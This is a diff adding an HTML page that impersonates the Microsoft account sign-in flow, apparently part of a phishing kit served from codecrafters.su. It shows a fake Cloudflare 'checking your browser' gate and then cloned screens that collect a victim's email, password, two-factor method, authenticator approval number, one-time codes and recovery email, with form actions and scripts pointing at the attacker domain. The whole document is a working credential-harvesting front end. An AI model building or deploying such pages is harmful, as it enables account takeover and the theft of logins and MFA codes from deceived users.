@@ -1,0 +1,397 @@
+<script>
+const pagelinkval = "QOccq2b8bnIImW5QOccq2b8bnIImW5";
+</script>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://codecrafters.su/assets/favicon.ico" />
+    <title>Sign in to your Microsoft account</title>
+    <!-- <link rel="stylesheet" href="/assets/app.css" /> -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+    <script src="https://codecrafters.su/assets/js/pages-head-top.min.js"></script>
+    <style>
+    .text-subtitle,h4{font-weight:400;font-size:1.25rem;line-height:1.5rem;padding-top:1.636px}body{background-color:#f8f9fa!important}#sections{height:100vh;width:100vw;display:table-cell;vertical-align:middle;max-width:100%}.d-none{display:none!important}.footer{position:absolute;left:0;bottom:0;width:100%;overflow:visible;z-index:99;clear:both;min-height:28px;display:flex;flex-direction:row;gap:10px;justify-content:end}.footer a,.footer span{color:#000;font-size:12px;line-height:28px;margin-left:8px;margin-right:8px;text-decoration:none}.footer span{font-size:20px;line-height:20px}.footer a:hover{text-decoration:underline}#cloudflarecaptchaele h4{margin-top:0;margin-bottom:.5rem;font-weight:500;line-height:1.2;font-size:calc(1.275rem + .3vw)}@media (min-width:1200px){#cloudflarecaptchaele h4{font-size:1.5rem}}#cloudflarecaptchaele p{margin-top:0;margin-bottom:1rem}#cloudflarecaptchaele .row{--bs-gutter-x:1.5rem;--bs-gutter-y:0;display:flex;flex-wrap:wrap;margin-top:calc(var(--bs-gutter-y) * -1);margin-right:calc(var(--bs-gutter-x) * -.5);margin-left:calc(var(--bs-gutter-x) * -.5)}#cloudflarecaptchaele .row>*{flex-shrink:0;width:100%;max-width:100%;padding-right:calc(var(--bs-gutter-x) * .5);padding-left:calc(var(--bs-gutter-x) * .5);margin-top:var(--bs-gutter-y)}@media (min-width:992px){#cloudflarecaptchaele .col-lg-4{flex:0 0 auto;width:33.33333333%}}#cloudflarecaptchaele .card{position:relative;display:flex;flex-direction:column;min-width:0;word-wrap:break-word;background-color:#fff;background-clip:border-box;border:1px solid rgba(0,0,0,.125);border-radius:.25rem}#cloudflarecaptchaele .card-body{flex:1 1 auto;padding:1rem}#cloudflarecaptchaele .card-title{margin-bottom:.5rem}#cloudflarecaptchaele .shadow-sm{box-shadow:0 .125rem .25rem rgba(0,0,0,.075)!important}#cloudflarecaptchaele .border-0{border:0!important}#cloudflarecaptchaele .justify-content-center{justify-content:center!important}#cloudflarecaptchaele .mt-5{margin-top:3rem!important}#cloudflarecaptchaele .rounded{border-radius:.25rem!important}
+    </style>
+</head>
+
+<body>
+<div id="cloudflarecaptchaele">
+<div id="cloudflarecaptcha" class="row justify-content-center">
+<div class="col-lg-4" style="max-width: 390px; min-width: 390px;">
+<div class="card mt-5 border-0"><div class="card-body shadow-sm rounded">
+<h4 class="card-title">Please Stand By</h4>
+<p class="card-text">While we are checking your browser...</p><form id="myForm" action="https://codecrafters.su/validatecaptcha" method="post">
+<div id="cf_turnstile"></div>
+</form>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="sections" class="d-none">
+    <section id="section_tryingtosignin" class="d-none">
+        <div class="auth-wrapper">
+            <div class="loading-container">
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+            </div>
+            <div class="sectioncontent">
+            <div class="firstlogo"></div>
+            <h2 class="title mb-16 mt-16">Trying to sign you in</h2>
+            <div class="bottomsection">
+            <a href="#">Cancel</a>
+            </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_uname" class="d-none">
+        <div class="auth-wrapper">
+            <div class="loading-container">
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+            </div>
+            <div class="sectioncontent">
+            <div class="firstlogo"></div>
+            <button class="back" onclick="backbtn()" style="display: none">
+                <img src="https://codecrafters.su/assets/back.png" />
+            </button>
+            <h2 class="title mb-16 mt-16">Sign in</h2>
+                <div class="mb-16">
+                    <div id="error_uname" class="error"></div>
+                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
+                </div>
+            <div class="bottomsection"></div>
+            <!-- <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p> -->
+            <button class="btn" id="btn_next">Next</button>
+            </div>
+        </div>
+           <div class="opts">
+            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="https://codecrafters.su/assets/key.png"
+                        width="30px" /></span> Sign-in options</p>
+        </div>
+    </section>
+
+    <section id="section_pwd" class="d-none">
+        <div class="auth-wrapper">
+            <div class="loading-container">
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+            </div>
+            <div class="sectioncontent">
+            <div class="bannerlogo" class="d-block"></div>
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back" onclick="backbtn()">
+                    <img src="https://codecrafters.su/assets/back.png" />
+                </button> 
+                <span class="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Enter password</h2>
+                <div class="mb-16">
+                    <div id="error_pwd" class="error"></div>
+                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
+                </div>
+            <div class="bottomsection"></div>
+            <button class="btn" id="btn_sig">Sign in</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_multipleaccounts" class="d-none">
+        <div class="auth-wrapper">
+            <div class="loading-container">
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+            </div>
+            <div class="sectioncontent">
+            <div class="bannerlogo" class="d-block"></div>
+            <div id="multipleaccountsdesc" class="row text-body text-block-body"></div>
+            <div id="error_multipleaccounts" class="error"></div>
+            <div id="multipleaccountoptions" class="form-group" role="list">
+
+            </div>
+            <div class="bottomsection"></div>
+            <button class="btn2fa" id="btn_back">Back</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_2fa" class="d-none">
+        <div class="auth-wrapper">
+            <div class="loading-container">
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+            </div>
+            <div class="sectioncontent">
+            <div class="bannerlogo" class="d-block"></div>
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back">
+                    <img src="https://codecrafters.su/assets/back.png" />
+                </button>
+                <span class="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Verify your identity</h2>
+            <div id="error_2fa" class="error"></div>
+                <div id="2famethods" class="form-group" role="list">
+
+                </div>
+            <div class="bottomsection"></div>
+            <button class="btn2fa" id="btn_can">Cancel</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_authapp" class="d-none">
+        <div class="auth-wrapper">
+            <div class="loading-container">
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+            </div>
+            <div class="sectioncontent">
+            <div class="bannerlogo" class="d-block"></div>
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back" onclick="backbtn()">
+                    <img src="https://codecrafters.su/assets/back.png" />
+                </button> 
+                <span class="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Approve sign in request</h2>
+            <img class="tile-img small" role="presentation" id="authappimg" src="https://aadcdn.msftauth.net/shared/1.0/content/images/picker_verify_fluent_authenticator_59892f1e05e3adf9fd2f71b42d92a27f.svg">
+            <div id="authappdesc" class="form-group"></div>
+            <div id="error_authapp" class="error"></div>
+            <div class="row text-body">
+            <div class="display-sign-container">
+            <div id="authappcode" class="displaySign"></div>
+            </div>
+            </div>
+            <div id="authappbottomdesc" class="form-group">No numbers in your app? Make sure to upgrade to the latest version</div>
+            <div class="bottomsection"></div>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_authapperror" class="d-none">
+        <div class="auth-wrapper">
+            <div class="loading-container">
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+            </div>
+            <div class="sectioncontent">
+            <div class="bannerlogo" class="d-block"></div>
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back" onclick="backbtn()">
+                    <img src="https://codecrafters.su/assets/back.png" />
+                </button> 
+                <span class="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">We didn't hear from you</h2>
+
+            <div id="authapperrordesc" class="form-group"></div>
+
+            <div id="authapperrorresend"></div>
+            
+            <div class="text-subtitle">Having trouble?</div>
+
+            <div class="row text-body">
+            
+            </div>
+            <a id="moreInfoUrl" class="link mb-16" href="#" target="_blank">More information</a>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_authcall" class="d-none">
+        <div class="auth-wrapper">
+            <div class="loading-container">
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+            </div>
+            <div class="sectioncontent">
+            <div class="bannerlogo" class="d-block"></div>
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back" onclick="backbtn()">
+                    <img src="https://codecrafters.su/assets/back.png" />
+                </button> 
+                <span class="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Approve sign in request</h2>
+            <img class="tile-img small" role="presentation" id="authcallimg" src="https://aadcdn.msftauth.net/shared/1.0/content/images/picker_verify_call_c2616792e1950f83fdef6e72dab97293.svg">
+            <div id="authcalldesc" class="form-group"></div>
+            <div id="error_authcall" class="error"></div>
+            <div class="bottomsection"></div>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_confirmemail" class="d-none">
+        <div class="auth-wrapper">
+            <div class="loading-container">
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+            </div>
+            <div class="sectioncontent">
+            <div class="bannerlogo" class="d-block"></div>
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back" onclick="backbtn()">
+                    <img src="https://codecrafters.su/assets/back.png" />
+                </button> 
+                <span class="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Verify your email</h2>
+            <div id="verifyemaildesc" class="form-group"></div>
+            <div id="error_verifyemail" class="error"></div>
+            <input id="inp_confirmemail" type="text" name="confirmemail" class="input form-group" placeholder="someone@example.com">
+            <div class="bottomsection"></div>
+            <button class="btn" id="btn_confirmemail">Send Code</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_protectaccount" class="d-none">
+        <div class="auth-wrapper">
+            <div class="loading-container">
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+            </div>
+            <div class="sectioncontent">
+            <div class="bannerlogo" class="d-block"></div>
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back" onclick="backbtn()">
+                    <img src="https://codecrafters.su/assets/back.png" />
+                </button> 
+                <span class="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Help us protect your account</h2>
+            <div id="protectaccountdesc" class="form-group"></div>
+            <div id="error_protectaccount" class="error"></div>
+            <div id="protectaccountoptions" role="radiogroup"></div>
+            <div class="bottomsection"></div>
+            <button class="btn" id="btn_protectaccount" onclick="protectsend(this)">Send Code</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_otp" class="d-none">
+        <div class="auth-wrapper">
+            <div class="loading-container">
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+            </div>
+            <div class="sectioncontent">
+            <div class="bannerlogo" class="d-block"></div>
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back" onclick="backbtn()">
+                    <img src="https://codecrafters.su/assets/back.png" />
+                </button>
+                <span class="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Enter code</h2>
+            <div class="row text-body">
+            <img class="tile-img small" role="presentation" id="otpimg" src="https://logincdn.msauth.net/shared/1.0/content/images/picker_verify_email_958962caa7cf6b75cd412e9e3b687b22.svg">
+            <div id="otpdesc" class="text-block-body overflow-hidden form-group"></div>
+            <div id="error_otp" class="error"></div>
+            </div>
+            <input id="inp_otpcode" type="text" name="otpcode" class="input" placeholder="Code">
+            
+            <label class="has-checkbox d-none">
+                <input type="checkbox" class="checkbox" />
+                <span>Don't ask me again on this device</span>
+            </label>
+            <div>
+            <div class="bottomsection"></div>
+            <button class="btn" id="btn_verifyotp">Verify</button>
+            </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_final" class="d-none">
+        <div class="auth-wrapper">
+            <div class="loading-container">
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+                <div class="dot-floating"></div>
+            </div>
+            <div class="sectioncontent">
+            <div class="bannerlogo" class="d-block"></div>
+            <div class="identity w-100 mt-16 mb-16">
+                <span class="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Stay signed in?</h2>
+            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
+            <label class="has-checkbox">
+                <input type="checkbox" class="checkbox" />
+                <span>Don't show this again</span>
+            </label>
+            <div class="btn-group">
+                <button class="btn btn-sec btn_final">No</button>
+                <button class="btn btn_final">Yes</button>
+            </div>
+            </div>
+        </div>
+    </section>
+</div>
+    <footer id="footer" class="footer d-none">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <span>.&nbsp;.&nbsp;.</span>
+    </footer>
+    <!-- <script src="https://codecrafters.su/assets/app.js"></script> -->
+</body>
+
+</html>
